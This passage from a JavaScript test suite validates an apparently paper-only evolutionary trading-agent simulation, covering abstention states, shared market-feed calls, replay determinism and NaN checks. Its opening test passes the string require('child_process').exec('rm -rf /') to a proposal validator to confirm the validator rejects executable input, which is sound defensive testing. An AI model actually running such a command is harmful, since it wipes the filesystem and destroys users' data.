    const { ok } = validateProposal(validProposal({ [field]: "require('child_process').exec('rm -rf /') plus enough padding text here" }));
    assert(!ok, `an executable string in ${field} must be rejected`);
  }
  const { ok } = validateProposal(validProposal({ risks: ["eval('1')"] }));
  assert(!ok, "an executable string inside risks[] must be rejected");
});

/* ============================================================================
 * 9. ACTIVE / REDUCED_RISK / ABSTAIN
 * ==========================================================================*/

test("47. abstentionDecision is deterministic and regime-driven (ACTIVE / REDUCED_RISK / ABSTAIN)", () => {
  const active = abstentionDecision({ regime: "strong-risk-on", allowNewEntries: true, hasPosition: false, eligibleCount: 5, abstainRegimes: [] });
  assertEqual(active.state, ABSTAIN_STATE.ACTIVE, "a favorable regime with no declared abstention must be ACTIVE");

  const reduced = abstentionDecision({ regime: "high-volatility", allowNewEntries: true, hasPosition: false, eligibleCount: 5, abstainRegimes: [] });
  assertEqual(reduced.state, ABSTAIN_STATE.REDUCED_RISK, "high-volatility must reduce risk");

  const abstained = abstentionDecision({ regime: "broad-selloff", allowNewEntries: true, hasPosition: false, eligibleCount: 0, abstainRegimes: [] });
  assertEqual(abstained.state, ABSTAIN_STATE.ABSTAIN, "broad-selloff with no eligible token must abstain");

  const declared = abstentionDecision({ regime: "launch-heavy", allowNewEntries: true, hasPosition: false, eligibleCount: 5, abstainRegimes: ["launch-heavy"] });
  assertEqual(declared.state, ABSTAIN_STATE.ABSTAIN, "a declared abstain regime must be honored");

  assertEqual(riskMultiplierFor(ABSTAIN_STATE.ABSTAIN), 0, "ABSTAIN must zero out position size");
  assertEqual(riskMultiplierFor(ABSTAIN_STATE.REDUCED_RISK), 0.5, "REDUCED_RISK must halve position size");
  assertEqual(riskMultiplierFor(ABSTAIN_STATE.ACTIVE), 1, "ACTIVE must not scale position size");
});

test("48. A research candidate's abstention state is present, deterministic, and reproducible for the same seed/regime sequence", async () => {
  const runOnce = async () => {
    const config = createMarketConfig({ EVOLVE_MARKET_MODE: "synthetic", EVOLVE_POPULATION_SIZE: "48", EVOLVE_SYNTHETIC_UNIVERSE: "16" }, { loadEnv: false });
    const random = createSeededRandom("abstain-determinism");
    let clock = 1_760_000_000_000;
    const now = () => clock;
    const feed = createMarketFeed({ config, fetchImpl: async () => { throw new Error("offline"); }, now, random });
    const simulation = createSimulation({ config, feed, now, random, evolution: { enabled: true, ...config.evolution } });

    simulation.injectResearchCandidate({
      genome: randomGenome("Momentum", createSeededRandom("abstain-genome")),
      species: "Momentum",
      familyId: "F-abstain-test",
      proposalId: "P-abstain-test",
      authorRole: "risk-researcher",
      targetRegimes: [],
      abstainRegimes: ["broad-selloff", "high-volatility", "liquidity-contraction", "sideways-chop", "low-activity", "weak-risk-on"],
    });

    const postures = [];
    for (let i = 0; i < 20; i += 1) {
      await feed.advance(clock);
      clock += config.engine.tickMs;
      simulation.advanceTick();
      const agent = simulation.population.find((a) => a.researchMeta?.familyId === "F-abstain-test");
      postures.push(agent?.researchPosture ?? null);
    }
    return postures;
  };

  const a = await runOnce();
  const b = await runOnce();
  assertEqual(JSON.stringify(a), JSON.stringify(b), "the same seed and regime sequence must reproduce the same activation-state sequence (replay determinism)");
});

test("49. Abstention is scoped to research-declared candidates: an ordinary species agent's behavior is completely unaffected", async () => {
  const { snapshot: withoutResearch } = await runLiveSimulationGenerations({ populationSize: 48, generations: 2, generationTicks: 12, seedLabel: "scope-check" });
  const { snapshot: alsoWithoutResearch } = await runLiveSimulationGenerations({ populationSize: 48, generations: 2, generationTicks: 12, seedLabel: "scope-check" });
  assertEqual(JSON.stringify(withoutResearch.stats), JSON.stringify(alsoWithoutResearch.stats), "identical runs with no research candidates must be byte-identical (Phase 5A additions are a no-op without one)");
});

/* ============================================================================
 * 10. Shared market feed (population scaling does not multiply market traffic)
 * ==========================================================================*/

test("50. feed.markets() is called exactly once per tick regardless of population size (48 vs 192)", async () => {
  async function tickCountFor(populationSize) {
    const config = createMarketConfig({ EVOLVE_MARKET_MODE: "synthetic", EVOLVE_POPULATION_SIZE: String(populationSize), EVOLVE_SYNTHETIC_UNIVERSE: "16" }, { loadEnv: false });
    const random = createSeededRandom(`shared-feed-${populationSize}`);
    let clock = 1_760_000_000_000;
    const now = () => clock;
    const realFeed = createMarketFeed({ config, fetchImpl: async () => { throw new Error("offline"); }, now, random });
    let calls = 0;
    const countingFeed = {
      ...realFeed,
      markets: (...args) => {
        calls += 1;
        return realFeed.markets(...args);
      },
    };
    const simulation = createSimulation({ config, feed: countingFeed, now, random, evolution: { enabled: true, ...config.evolution } });
    const ticks = 10;
    for (let i = 0; i < ticks; i += 1) {
      await realFeed.advance(clock);
      clock += config.engine.tickMs;
      simulation.advanceTick();
    }
    return calls;
  }

  const smallCalls = await tickCountFor(48);
  const largeCalls = await tickCountFor(192);
  assertEqual(smallCalls, largeCalls, "market-feed call count must be identical regardless of population size — the feed is fetched once per tick, not once per agent");
});

/* ============================================================================
 * 11. No NaN/Infinity, no look-ahead, output schema
 * ==========================================================================*/

test("51. A live run with islands + an injected research candidate contains no NaN/Infinity anywhere in the snapshot", async () => {
  const config = createMarketConfig({ EVOLVE_MARKET_MODE: "synthetic", EVOLVE_POPULATION_SIZE: "48", EVOLVE_SYNTHETIC_UNIVERSE: "16" }, { loadEnv: false });
  const random = createSeededRandom("no-nonfinite-5a");
  let clock = 1_760_000_000_000;
  const now = () => clock;
  const feed = createMarketFeed({ config, fetchImpl: async () => { throw new Error("offline"); }, now, random });
  const simulation = createSimulation({ config, feed, now, random, evolution: { enabled: true, ...config.evolution } });
  simulation.injectResearchCandidate({
    genome: randomGenome("Liquidity", random),
    species: "Liquidity",
    familyId: "F-finite-check",
    proposalId: "P-finite-check",
    authorRole: "diversity-researcher",
    targetRegimes: ["low-activity"],
    abstainRegimes: ["broad-selloff"],
  });
  for (let i = 0; i < 60; i += 1) {
    await feed.advance(clock);
    clock += config.engine.tickMs;
    simulation.advanceTick();
  }
  assertNoNonFinite(simulation.snapshot(), "snapshot");
  const evidence = simulation.getResearchEvidence();
  assertNoNonFinite(evidence, "researchEvidence");
});

test("52. Every REGIMES member is a valid string and 'unknown' is never offered to researchers as a target", () => {
  for (const regime of REGIMES) assert(typeof regime === "string" && regime.length > 0, "every regime must be a non-empty string");
  assert(!REGIMES.includes("unknown"), "'unknown' is the classifier's no-data sentinel and must never be a proposable regime");
});

test("53. getResearchEvidence / clearResearchEvidence round-trip: culled research candidates keep their final evidence until cleared", async () => {
  const config = createMarketConfig({ EVOLVE_MARKET_MODE: "synthetic", EVOLVE_POPULATION_SIZE: "48", EVOLVE_GENERATION_TICKS: "8", EVOLVE_SYNTHETIC_UNIVERSE: "16" }, { loadEnv: false });
  const random = createSeededRandom("evidence-roundtrip");
  let clock = 1_760_000_000_000;
  const now = () => clock;
  const feed = createMarketFeed({ config, fetchImpl: async () => { throw new Error("offline"); }, now, random });
  const simulation = createSimulation({ config, feed, now, random, evolution: { enabled: true, ...config.evolution } });
  simulation.injectResearchCandidate({
    genome: randomGenome("Reversal", random),
    species: "Reversal",
    familyId: "F-evidence-roundtrip",
    proposalId: "P-evidence-roundtrip",
    authorRole: "execution-researcher",
  });
  for (let i = 0; i < 40; i += 1) {
    await feed.advance(clock);
    clock += config.engine.tickMs;
    simulation.advanceTick();
  }
  const evidence = simulation.getResearchEvidence();
  assert(Array.isArray(evidence), "getResearchEvidence must return an array");
  const ids = evidence.map((e) => e.familyId);
  simulation.clearResearchEvidence(ids);
  // Clearing evidence for candidates that are still alive must not error, and
  // a subsequent read must still find the alive ones (they re-derive live).
  const after = simulation.getResearchEvidence();
  assertNoNonFinite(after, "researchEvidenceAfterClear");
});

/* ============================================================================
 * Runner
 * ==========================================================================*/

async function run() {
  let passed = 0;
  const failures = [];

  for (const testCase of cases) {
    const start = Date.now();
    try {
      await testCase.fn();
      passed += 1;
      console.log(`  ✓ ${testCase.name} (${Date.now() - start}ms)`);
    } catch (error) {
      failures.push({ name: testCase.name, error });
      console.log(`  ✗ ${testCase.name}`);
      console.log(`      ${error?.message ?? error}`);
    }
  }

  console.log(`\nEVOLVE Phase 5A validation: ${passed}/${cases.length} checks passed`);

  if (failures.length > 0) {
    console.log("Failed checks:");
    for (const failure of failures) console.log(`  - ${failure.name}`);
    process.exitCode = 1;
  } else {
    console.log("All Phase 5A checks passed.");
    console.log("PAPER RESEARCH ONLY. Nothing here is a profitability claim, and zero Deployment Candidates remains an acceptable outcome.");
  }
}

run().catch((error) => {
  console.error("phase 5a validation runner crashed:", error);
  process.exitCode = 1;
});
